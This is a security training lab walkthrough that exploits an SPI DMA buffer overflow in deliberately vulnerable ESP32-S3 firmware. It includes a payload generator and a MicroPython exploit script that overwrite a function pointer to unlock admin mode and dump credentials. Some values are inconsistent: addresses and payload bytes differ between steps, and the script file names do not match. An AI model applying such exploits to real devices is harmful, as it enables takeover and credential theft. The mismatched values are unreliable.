# L19: SPI DMA Buffer Overflow - Function Pointer Hijack

## Goal
Exploit a buffer overflow in an SPI DMA transfer handler to corrupt an adjacent function pointer and redirect execution to `spi_admin_unlock()`. Success enables persistent debug mode, dumps credentials to serial, and flashes the screen RED.

## Background

**Why this matters**: SPI is one of the most common buses in IoT devices. Many SPI drivers use DMA (Direct Memory Access) to transfer data without CPU involvement. If the receiving buffer lacks bounds checking, an oversized DMA transfer silently overwrites adjacent memory. Unlike CPU-mediated overflows, the processor never inspects the data, so software watchdogs and runtime checks are completely bypassed.

**What you're looking for in IoT devices:**
- SPI peripherals that receive variable-length data (sensors, radio modules, flash chips)
- DMA transfer handlers that copy data into fixed-size buffers without length validation
- Structs where data buffers sit adjacent to function pointers or control flags
- Debug or diagnostic interfaces that allow sending raw SPI-like data

**What is DMA?**
- **Direct Memory Access** allows peripherals to read/write RAM independently of the CPU
- The CPU configures a transfer (source, destination, byte count) and the DMA controller handles it
- If the transfer length exceeds the destination buffer, adjacent memory is silently overwritten with no exception raised

**On CoreS3**: The firmware runs an SPI slave on Port.B/C (MOSI=GPIO8, SCK=GPIO17, CS=GPIO18) that accepts incoming DMA transfers. The receive handler copies data into a packed C struct containing a **64-byte DMA buffer immediately followed by a function pointer** - with no bounds checking. By sending 68 bytes (64 padding + 4-byte address) from an external SPI master, an attacker overwrites the function pointer. The handler then calls it, jumping to the attacker's chosen address. The target `spi_admin_unlock()` triggers RED screen, alarm, and SOS LED.

## Lab Walkthrough

### Step 1: Understand the Vulnerable Struct Layout

Examine the memory layout to determine the function pointer offset.

```
Struct layout in memory (packed, no padding):

Offset  0 +--------------------------+
          | dmaBuffer[64]            |  64 bytes - SPI receive data
          | (your padding goes here) |
Offset 64 +--------------------------+
          | dmaCallback              |  4 bytes - function pointer
          | (your target address)    |
Offset 68 +--------------------------+

Normal:   dmaCallback = spi_default_handler
Overflow: dmaCallback = spi_admin_unlock (triggers RED screen + alarm)
```

### Step 2: Find the Target Function Address

Use `nm` or `objdump` to locate `spi_admin_unlock` in the firmware ELF binary. ESP32-S3 has no ASLR, so addresses are fixed at compile time.


**Note:** `xtensa-esp32s3-elf-*` tools are Xtensa cross-tools for ESP32-S3, not standard Linux binaries. See the main [labs README](../LABS.md) for installation instructions.

```bash
# Find spi_admin_unlock in the symbol table
xtensa-esp32s3-elf-nm .pio/build/M5CoreS3/firmware.elf | grep spi_admin_unlock

# Expected output (address will vary per build):
# 4200D4B8 T spi_admin_unlock

# Alternative: use objdump for more detail
xtensa-esp32s3-elf-objdump -t .pio/build/M5CoreS3/firmware.elf | grep spi_admin_unlock

# Expected output:
# 4200D4B8 g     F .flash.text   000000b8 spi_admin_unlock
```

Note the address (e.g., `0x4200D540`). The `T` indicates a global function in the text section.

### Step 3: Verify the SPI Slave is Running

The SPI slave starts automatically at boot on the standard firmware. Check the boot log for confirmation:

```bash
pio device monitor -b 115200

# During boot, look for:
# [SPI-DMA] Slave online (MOSI=GPIO8, SCK=GPIO17, CS=GPIO18)
```

**SPI slave pin connections (CoreS3 expansion header):**

| Signal | GPIO | Description |
|--------|------|-------------|
| MOSI | GPIO8 (Port.B) | Data from master to slave (your payload goes here) |
| MISO | GPIO9 (Port.B) | Data from slave to master (unused) |
| SCK | GPIO17 (Port.C) | Clock from master |
| CS | GPIO18 (Port.C) | Chip select (active LOW) |
| GND | GND | Common ground with your SPI master |

Connect your Raspberry Pi Pico to these pins.

### Step 4: Craft the Exploit Payload

Build a hex-encoded payload: 64 bytes of padding followed by the target address in little-endian byte order. ESP32-S3 is little-endian, so `0x4200D540` becomes bytes `40 D5 00 42`.

```python
#!/usr/bin/env python3
"""Generate SPI DMA overflow payload for function pointer hijack."""
import struct

BUFFER_SIZE = 64
TARGET_ADDR = 0x4200D540  # spi_admin_unlock address (from Step 2)

# Build payload: padding + address in little-endian
padding = b'A' * BUFFER_SIZE              # 64 bytes to fill dmaBuffer
address = struct.pack('<I', TARGET_ADDR)   # 4 bytes, little-endian

payload = padding + address
hex_payload = payload.hex()

print(f"Buffer size:    {BUFFER_SIZE} bytes")
print(f"Target address: 0x{TARGET_ADDR:08x}")
print(f"Little-endian:  {address.hex()}")
print(f"Payload length: {len(payload)} bytes ({len(hex_payload)} hex chars)")
print(f"\nHex payload:\n{hex_payload}")

# Output:
# Buffer size:    64 bytes
# Target address: 0x4200D540
# Little-endian:  40d50042
# Payload length: 68 bytes (136 hex chars)
#
# Hex payload:
# 4141414141...414140d50042
```

**Important:** Replace `0x4200D540` with the actual address from YOUR build (Step 2).

### Step 5: Send the Exploit via SPI Master

Use a Raspberry Pi Pico as an SPI master to send the 68-byte payload. If you haven't set up MicroPython on the Pico yet, see the [Raspberry Pi Pico Setup](../LABS.md#raspberry-pi-pico-setup-required-for-l18-l19-l32) section in the main labs README. The DMA handler copies all bytes without bounds checking: bytes 0-63 fill `dmaBuffer`, bytes 64-67 overwrite `dmaCallback`. The handler then calls `dmaCallback()`, jumping to `spi_admin_unlock`.

**Pico wiring:**
```
Pico GP11 (SPI1 MOSI) --> CoreS3 GPIO8  (SPI MOSI)
Pico GP10 (SPI1 SCK)  --> CoreS3 GPIO17 (SPI SCK)
Pico GP13 (CS)   --> CoreS3 GPIO18 (SPI CS)
Pico GND         --> CoreS3 GND
```

**MicroPython exploit script (save as `spi_exploit.py` on the Pico):**

```python
from machine import Pin, SPI
import struct

spi = SPI(1, baudrate=1000000, polarity=0, phase=0,
          sck=Pin(10), mosi=Pin(11), miso=Pin(12))
cs = Pin(13, Pin.OUT, value=1)

# spi_admin_unlock address (from nm/objdump in Step 2)
target_addr = 0x4200D540

# Build payload: 64 bytes padding + target address (little-endian)
payload = b'A' * 64 + struct.pack('<I', target_addr)
addr_bytes = struct.pack('<I', target_addr)

print("Sending", len(payload), "bytes via SPI...")
print("Target: 0x%08X -> %s" % (target_addr, addr_bytes.hex()))

cs.value(0)
spi.write(payload)
cs.value(1)

print("Sent! Check CoreS3 screen for RED flash.")
```

**Copy to Pico and run:**

```bash
# From the tools/ directory:
mpremote connect /dev/ttyACM1 cp pico_spi_exploit.py :main.py
mpremote connect /dev/ttyACM1 run pico_spi_exploit.py

# Expected output:
# Sending 68 bytes via SPI...
# Target: 0x4200D540 -> 40d50042
# Sent! Check CoreS3 screen for RED flash.
```

**Important:** Replace `0x4200D540` with the actual address from YOUR build (Step 2).

### Step 6: Observe Exploitation Success

**What happens on success:**

1. **Screen flashes RED** with "DEBUG ENABLED" in white text, and "Persistent - survives reboot" below
2. **Speaker plays** a single tone at 880 Hz for 200 ms
3. **Debug mode is enabled** and **persisted to NVS** (survives reboot - this is the most dangerous outcome)
4. **Admin mode is unlocked** on the serial console
5. **Serial output** dumps credentials (PIN values are randomly generated per device):

```
admin_pin=YYYYYY
user_pin=XXXXXX
debug_mode=ENABLED
```

**Verify via serial:**

```bash
cores3-cam> whoami
# Expected: admin

cores3-cam> nvs-dump
# Shows debug_mode: 1 (persisted to flash)
```

**Verify via HTTP:**

```bash
curl -s http://192.168.4.1/status
# Look for: "admin_mode":true, "debug_mode":true
```

**Unlike other overflow targets, `spi_admin_unlock()` calls `saveSettings()`, making the debug mode change persistent across reboots.** To undo, use `nvs-clear` or factory reset.

### Step 7: Exploitation Chain Summary

```
Exploitation chain:

1. RECON: Find spi_admin_unlock address via nm/objdump
   -> 0x4200D540 (no ASLR, address is deterministic)

2. CRAFT: Build 68-byte payload
   -> Bytes 0-63:  0x41 padding (fills dmaBuffer[64])
   -> Bytes 64-67: 0x18 0xD5 0x00 0x42 (overwrites dmaCallback)

3. DELIVER: Send via Raspberry Pi Pico SPI master
   -> Real SPI transfer to slave on GPIO8/17/18

4. OVERFLOW: spi_dma_receive() copies 68 bytes into 64-byte buffer
   -> No bounds check: for (i = 0; i < len && i < 256; i++)
   -> 256-byte cap exists but 68 < 256, so overflow proceeds

5. HIJACK: Handler calls g_spiDma.dmaCallback()
   -> Pointer was overwritten to point to spi_admin_unlock()

6. EXECUTE: spi_admin_unlock() runs with full privileges
   -> RED screen + debug mode enabled (persistent) + credentials dumped to serial
```

## Impact

- **Arbitrary code execution via DMA** - attacker hijacks a function pointer through a peripheral data path that bypasses CPU validation
- **SPI bus is a shared attack surface** - any device on the SPI bus could inject malicious DMA data
- **No CPU-level detection** - DMA transfers bypass software watchdogs, stack canaries, and integrity checks
- **No ASLR on microcontrollers** - function addresses are fixed, making ret2func attacks trivially reliable
- **Applies to real IoT hardware** - SPI DMA is used in nearly every embedded system for flash, display, radio, and sensor I/O

## Hints

**Hint 1: Finding the address**

Use `xtensa-esp32s3-elf-nm` from the PlatformIO toolchain to find the exact address:
```bash
xtensa-esp32s3-elf-nm .pio/build/M5CoreS3/firmware.elf | grep spi_admin_unlock
```
The address is in the leftmost column. It will be in the `0x42xxxxxx` range (flash-mapped code).


**Hint 2: Endianness**

ESP32-S3 (Xtensa LX7) is **little-endian**. A 4-byte address `0x4200D540` is stored in memory as:
```
Byte 0: 0x40  (least significant byte first)
Byte 1: 0xD5
Byte 2: 0x00
Byte 3: 0x42  (most significant byte last)
```
In hex string form: `40d50042`


**Hint 3: Complete payload**

The DMA buffer is exactly 64 bytes. The function pointer is at offset 64.
Your payload is: 64 bytes of padding + 4 bytes of address = 68 bytes total.
In hex: `'41' * 64 + '40d50042'` = 136 hex characters.


## Success Criteria

- [ ] Located `spi_admin_unlock()` address via nm/objdump (in the `0x4200xxxx` range)
- [ ] Understood the struct layout: 64-byte buffer + function pointer at offset 64
- [ ] Crafted payload with correct padding length and little-endian address
- [ ] Sent payload via Raspberry Pi Pico SPI master
- [ ] **Screen flashed RED with "DEBUG ENABLED"**
- [ ] **Heard tone at 880 Hz**
- [ ] **Serial output showed `admin_pin`, `user_pin`, and `debug_mode=ENABLED`**
- [ ] **Debug mode persisted across reboot** (verified via `/status` or `nvs-dump`)

## References

- [CWE-120: Buffer Copy without Checking Size of Input](https://cwe.mitre.org/data/definitions/120.html)
- [CWE-787: Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html)
- [CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input](https://cwe.mitre.org/data/definitions/1285.html)
- [ESP32-S3 SPI Master Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/peripherals/spi_master.html)
- [ESP32-S3 GDMA (General DMA) Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/esp32s3/api-reference/system/gdma.html)
- [ESP32-S3 Technical Reference Manual - DMA Controller](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
- [OWASP Embedded Application Security - Buffer Overflow](https://owasp.org/www-project-embedded-application-security/)
